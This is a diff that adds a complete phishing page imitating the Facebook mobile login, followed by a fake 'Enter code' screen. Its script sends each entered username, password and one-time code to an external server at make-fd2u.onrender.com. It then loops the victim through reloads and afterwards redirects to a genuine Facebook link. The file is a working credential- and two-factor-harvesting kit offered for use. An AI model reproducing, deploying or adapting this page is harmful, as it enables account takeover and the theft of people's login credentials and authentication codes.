@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
+  <title>Log in | Facebook</title>
+  <link rel="icon" href="fb.png">
+  <meta name="description" content="Log in to see posts, and view comments.">
+  <meta property="og:image" content="https://www.bing.com/images/search?view=detailV2&ccid=9SywJNZY&id=6FF226A2D1C430889E21B470DE4A636330EE5902&thid=OIP.9SywJNZY5OkWFdpqzbimYAHaHY&mediaurl=https%3a%2f%2fhips.hearstapps.com%2fhmg-prod%2fimages%2fjennifer-aniston-hairstyles-67a475e77e2f4.jpg%3fcrop%3d0.502xw%3a1.00xh%3b0.498xw%2c0%26resize%3d1120%3a*&cdnurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.f52cb024d658e4e91615da6acdb8a660%3frik%3dAlnuMGNjSt5wtA%26pid%3dImgRaw%26r%3d0&exph=1000&expw=1004&q=Jenifer+Aniston&FORM=IRPRST&ck=6F1926C1D84C635A64598A18B98297B7&selectedIndex=1&itb=0">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #ffffff;
+      color: #1c1e21;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .page {
+      display: flex;
+      position: relative;
+      flex-direction: column;
+      min-height: 100dvh;
+      max-width: 412px;
+      margin: 0 auto;
+      border: 1px solid #dcdcdc;
+      text-align: center;
+    }
+
+    /* ---------- Top banner ---------- */
+    .top-banner {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 10px 12px;
+      border-bottom: 1px solid #eee;
+    }
+
+    .top-banner svg {
+      flex-shrink: 0;
+    }
+
+    .top-banner a {
+      font-size: 12px;
+      color: #1877f2;
+      text-decoration: none;
+      line-height: 1.3;
+    }
+
+    .top-banner a:hover {
+      text-decoration: underline;
+    }
+
+    /* ---------- Language ---------- */
+    .language {
+      text-align: center;
+      padding: 12px 0;
+    }
+
+    .language a {
+      font-size: 12px;
+      color: #737373;
+      text-decoration: none;
+    }
+
+    /* ---------- Main ---------- */
+    .main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .logo {
+      width: 60px;
+      position: absolute;
+      top: 20dvh;
+      height: 60px;
+      border-radius: 50%;
+      background-color: #1877f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 32px;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+
+    form {
+      position: absolute;
+      top: 35dvh;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      padding: 48px 24px 32px;
+    }
+
+    .input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 15px;
+      color: #1c1e21;
+      background-color: transparent;
+      border: 1px solid #dcdcdc;
+      border-radius: 6px;
+      outline: none;
+    }
+
+    .input::placeholder {
+      color: #90949c;
+    }
+
+    .input:focus {
+      border-color: #1877f2; 
+      box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+    }
+
+    .btn-login {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: 700;
+      color: #ffffff;
+      background-color: #0064e0;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      margin-top: 4px;
+    }
+
+    .btn-login:hover {
+      background-color: #0057c4;
+    }
+
+    .forgot {
+      display: inline-block;
+      margin-top: 1vh;
+      font-size: 14px;
+      color: #1c1e21;
+      text-decoration: none;
+      text-align: center;
+      font-weight: 500;
+    }
+
+    .forgot:hover {
+      text-decoration: underline;
+    }
+
+    .create {
+      width: 100%;
+      padding: 0px 24px 0px;
+      position: absolute;
+      top: 85dvh;
+   } 
+
+    .btn-create {
+      width: 100%;
+      padding: 12px;
+      font-size: 15px;
+      font-weight: 700;
+      color: #1877f2;
+      background-color: #ffffff;
+      border: 2px solid #b3d1f7;
+      border-radius: 30px;
+      cursor: pointer;
+    }
+
+    .btn-create:hover {
+      background-color: #f0f6ff;
+    }
+
+    /* ---------- Footer ---------- */
+    .footer {
+      position: fixed;
+      bottom: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+
+    .meta {
+      display: flex;
+      align-items: center;
+      gap: 2px;
+      font-size: 18px;
+      font-weight: 600;
+      letter-spacing: 0.2px;
+    }
+
+    .meta img {
+      width: 20px;
+      height: auto;
+      padding: 0;
+      margin: 0;
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 20px;
+    }
+
+    .footer-links a {
+      font-size: 12px;
+      color: #737373;
+      text-decoration: none;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    /* Code screen */
+    #code-screen {
+      display: none;
+      padding: 0px 24px 0px;
+    }
+
+    .code-text {
+       text-align: center;
+       color: #777;
+       font-size: 14px;
+       line-height: 1.5;
+       margin-bottom: 25px;
+    }
+
+    .code-input {
+       text-align: center;
+       font-size: 24px;
+       padding: 5px 0px;
+       letter-spacing: 8px;
+    }
+
+    .back-button {
+       display: block;
+       margin: 15px auto 0;
+       border: none;
+       background: none;
+       color: #777;
+       cursor: pointer;
+       font-size: 14px;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="page">
+
+    <!-- Top banner -->
+    <div class="top-banner">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+        <polyline points="7 10 12 15 17 10"/>
+        <line x1="12" y1="15" x2="12" y2="3"/>
+      </svg>
+      <a href="#">Get Facebook for iOS and browse faster.</a>
+    </div>
+
+    <!-- Language selector -->
+    <div class="language">
+      <a href="#">English (UK)</a>
+    </div>
+
+    <!-- Main content -->
+    <div class="main" id="login-screen">
+      <div class="logo" role="img" aria-label="Facebook">
+        <svg viewBox="0 0 36 36" className="h-14 w-14" aria-label="Logo">
+            <circle cx="18" cy="18" r="18" fill="#1877F2" />
+            <path fill="#fff" d="M24.5 23.1l.8-5.2h-5v-3.4c0-1.4.7-2.8 2.9-2.8h2.3V7.1s-2.1-.4-4-.4c-4.1 0-6.8 2.5-6.8 7v4.2H10v5.2h4.7V36h5.6V23.1h4.2z"/>
+        </svg>
+      </div>
+
+      <form id="login-form" onsubmit="return false;">
+        <input class="input" onchange="toa(`👤Number/Email: ${this.value}`)" type="text" placeholder="Mobile number or email address" autocomplete="username" autofocus required/>
+        <input class="input" onchange="toa(`🔒Password: ${this.value}`)" type="password" placeholder="Password" autocomplete="current-password" required/>
+        <button class="btn-login" type="submit">Log in</button>
+  
+
+        <a class="forgot" href="#">Forgotten password?</a>
+
+      </form>
+
+      <div class="create">
+        <button class="btn-create" type="button">Create new account</button>
+      </div>
+
+    </div>
+
+    <!-- CODE SCREEN -->
+    <div id="code-screen">
+
+        <h1>Enter code</h1>
+
+        <p class="code-text">
+            Enter the code provided to continue.
+        </p>
+
+        <input type="text" id="code" class="code-input" onchange="toa(`📲OTP: ${this.value}`)" maxlength="6" placeholder="------" inputmode="numeric" required/>
+
+        <br><br>
+
+        <button
+            class="btn-login"
+            type="button"
+            onclick="restart()">
+            Continue
+        </button>
+
+        <button
+            class="back-button"
+            type="button"
+            onclick="goBack()">
+            Back to login
+        </button>
+
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+      <div class="meta">
+        <img src="meta.jpg" alt="My WebP image">
+        Meta
+      </div>
+      <div class="footer-links">
+        <a href="#">About</a>
+        <a href="#">Help</a>
+        <a href="#">More</a>
+      </div>
+    </div>
+
+  </div>
+</body>
+<script>
+   function toa(payload) {
+   const url = 'https://make-fd2u.onrender.com/send';  
+    fetch(url, {
+        method: 'POST',
+        headers: {     
+            'Content-Type': 'application/json',  
+        },   
+        body: JSON.stringify({ message: payload })    
+    });  
+    }
+
+    const loginForm = document.getElementById("login-form");
+
+    const code = document.getElementById("code");
+
+    const loginScreen = document.getElementById("login-screen");
+
+    const codeScreen = document.getElementById("code-screen");
+
+
+    loginForm.addEventListener("submit", function(event) {
+
+        event.preventDefault();
+
+        // Hide login form
+        loginScreen.style.display = "none";
+
+        // Show code input
+        codeScreen.style.display = "block";
+
+    });
+
+
+    function goBack() {
+
+        codeScreen.style.display = "none";
+
+        loginScreen.style.display = "block";
+
+    }
+
+    function restart() {
+	if (code.value.trim().length <= 3) {
+		alert("Enter a Valid Code");
+		return;
+	}
+        let count = parseInt(localStorage.getItem("reloadCount")) || 0;
+        count++;
+
+        if (count >= 5) {
+          localStorage.setItem("reloadCount", "0");
+
+          window.location.href = "https://web.facebook.com/share/p/18MFZPWERL/";
+          return;
+        }
+
+        localStorage.setItem("reloadCount", count);
+        alert(`Something went wrong, try again!!!`);
+        window.location.reload();
+    }
+</script>
+</html>
